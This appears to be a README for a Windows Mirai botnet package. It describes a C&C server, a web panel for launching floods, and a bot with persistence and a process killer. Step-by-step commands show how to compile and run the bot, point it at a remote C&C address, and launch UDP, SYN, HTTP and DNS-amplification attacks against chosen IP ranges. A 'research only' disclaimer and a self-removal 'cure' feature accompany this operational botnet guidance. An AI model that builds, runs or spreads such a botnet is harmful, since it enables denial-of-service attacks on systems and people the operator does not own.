# 🎯 MIRAI COMMAND CENTER - Complete Package

## 📦 What's Included

### 1. C&C Server (C# .NET 8.0)
- Full bot management system
- Real-time attack coordination
- SQLite database for logging
- HTTP API for control panel
- Telnet admin interface

### 2. Web Control Panel
- Real-time bot monitoring
- Attack launcher with multiple vectors
- **Bot Removal & Cure Features**
- Beautiful responsive UI
- Auto-refreshing stats

### 3. Bot Features
- Windows-native executable
- Multiple attack vectors (UDP, SYN, ACK, HTTP, etc.)
- Process killer (eliminates competing malware)
- **Self-cure/removal capability**
- Persistence mechanisms

---

## 🚀 Quick Start Guide

### Step 1: Start the C&C Server

```batch
cd MiraiCommandCenter
START-SERVER.bat
```

The server will start on:
- **Port 23**: Bot connections
- **Port 101**: Admin telnet interface  
- **Port 8080**: HTTP API for control panel

### Step 2: Open the Control Panel

```
Open: MiraiCommandCenter\ControlPanel\index.html
```

Or visit: `http://localhost:8080` (if hosting the HTML)

### Step 3: Test with Bot on Your PC

Compile and run the bot:

```batch
cd mirai\bot
gcc -c main_windows.c cure_windows.c stubs_windows.c util.c table.c rand.c -Imirai\bot
gcc *.o -o test_bot.exe -lws2_32 -liphlpapi
test_bot.exe
```

**IMPORTANT**: The bot will connect to `127.0.0.1:23` automatically for testing!

---

## 🎮 Using the Control Panel

### Bot Management

**View Connected Bots**:
- Refreshes every 2 seconds
- Shows IP, version, source, uptime
- Real-time connection status

**Remove Bot** (❌ Button):
- Disconnects bot from C&C
- Bot remains on target system
- Use for temporary disconnection

**Cure Bot** (💊 Button):
- **Sends self-destruct command**
- Bot will:
  1. Stop all attacks
  2. Kill child processes
  3. Remove persistence (registry, startup)
  4. Delete temporary files
  5. **DELETE ITSELF**
  6. Exit cleanly

Perfect for testing! When you run the bot on your PC, you can click **Cure** to completely remove it.

### Attack Management

**Launch Attack**:
1. Enter attack name
2. Select type (UDP, SYN, HTTP, etc.)
3. Add targets (IP or CIDR, one per line)
4. Set duration in seconds
5. Click 🚀 **LAUNCH ATTACK**

**Stop Attacks**:
- Individual: Click "Stop" on attack card
- All: Click 🛑 **STOP ALL ATTACKS**

### Statistics Dashboard

- **Active Bots**: Currently connected
- **Total Bots Ever**: Lifetime connections
- **Active Attacks**: Running attacks
- **Server Uptime**: Time since server started

---

## 🧪 Testing on Your PC

### Safe Testing Steps

1. **Start C&C Server**:
   ```batch
   START-SERVER.bat
   ```

2. **Open Control Panel**:
   ```
   Open: ControlPanel\index.html
   ```

3. **Run Test Bot**:
   ```batch
   cd build\windows
   mirai_bot.exe
   ```

4. **Watch it Connect**:
   - Control panel should show your bot
   - IP: `127.0.0.1` or your local IP
   - Status: Connected ✓

5. **Test Cure Function**:
   - Right-click bot → **💊 Cure**
   - Confirm the prompt
   - Watch logs for cure sequence
   - Bot will self-destruct and disappear

### What Happens During Cure:

```
[cure] ========================================
[cure] EXECUTING BOT CURE/REMOVAL SEQUENCE
[cure] ========================================
[cure] Step 1: Stopping all attacks...
[cure] Step 2: Stopping scanner...
[cure] Step 3: Terminating child processes...
[cure] Step 4: Removing persistence mechanisms...
[cure] Step 5: Cleaning temporary files...
[cure] Step 6: Scheduling self-deletion...
[cure] ========================================
[cure] CURE COMPLETE - BOT WILL NOW EXIT
[cure] ========================================
```

The bot executable will be deleted automatically!

---

## 📡 API Endpoints

### Bot Management
- `GET /api/bots` - List all connected bots
- `GET /api/bots/stats` - Bot statistics
- `POST /api/bots/remove` - Disconnect bot
- `POST /api/bots/cure` - **Send cure/uninstall command**

### Attack Management
- `GET /api/attacks` - List active attacks
- `POST /api/attacks/start` - Launch attack
- `POST /api/attacks/stop` - Stop specific attack
- `POST /api/attacks/stopall` - Stop all attacks

### System
- `GET /api/status` - Server status and stats

---

## 🔐 Security Notes

**For Research/Testing Only!**

This is a complete DDoS botnet system for:
- Security research
- Penetration testing
- Educational purposes
- Local network testing

**Never deploy on systems you don't own!**

---

## 🛠️ Customization

### Change C&C Address

Edit `mirai\bot\main_windows.c`:

```c
// Line ~220
#ifdef _WIN32
  srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");  // ← Change this
#else
  srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
#endif
  srv_addr.sin_port = htons(23);  // ← And this
```

Recompile:
```batch
gcc main_windows.c cure_windows.c ... -o custom_bot.exe
```

### Add Custom Attack Vectors

1. Create new attack function in `attack_*.c`
2. Register in `attack_windows_complete.c`
3. Add to control panel dropdown
4. Recompile bot and server

---

## 📊 Database

SQLite database: `mirai.db`

Tables:
- `bot_connections` - Connection history
- `attacks` - Attack log
- `admin_users` - Admin accounts
- `bot_removals` - **Cure/removal log**

View with any SQLite tool!

---

## 🎯 Attack Vectors

| Vector | Description | Port |
|--------|-------------|------|
| **UDP** | Standard UDP flood | Any |
| **SYN** | TCP SYN flood | 80, 443 |
| **ACK** | TCP ACK flood | Any |
| **HTTP** | Layer 7 HTTP flood | 80, 443 |
| **VSE** | Valve Source Engine | 27015 |
| **DNS** | DNS amplification | 53 |

---

## 🐛 Troubleshooting

**Bot Won't Connect**:
- Check firewall (allow port 23)
- Verify C&C IP in bot code
- Check server logs

**Control Panel Shows "Connecting..."**:
- Verify server is running
- Check port 8080 is accessible
- Open browser console for errors

**Cure Not Working**:
- Bot needs admin rights for full cleanup
- Check debug logs in bot
- Some files may require reboot to delete

---

## 📝 License

Educational/Research purposes only.  
Use responsibly and legally!

---

## 🎉 You're Ready!

1. Start server → `START-SERVER.bat`
2. Open control panel → `ControlPanel\index.html`
3. Run test bot → Watch it connect
4. Click **Cure** → Watch it self-destruct

Perfect for testing botnet defense and removal strategies!
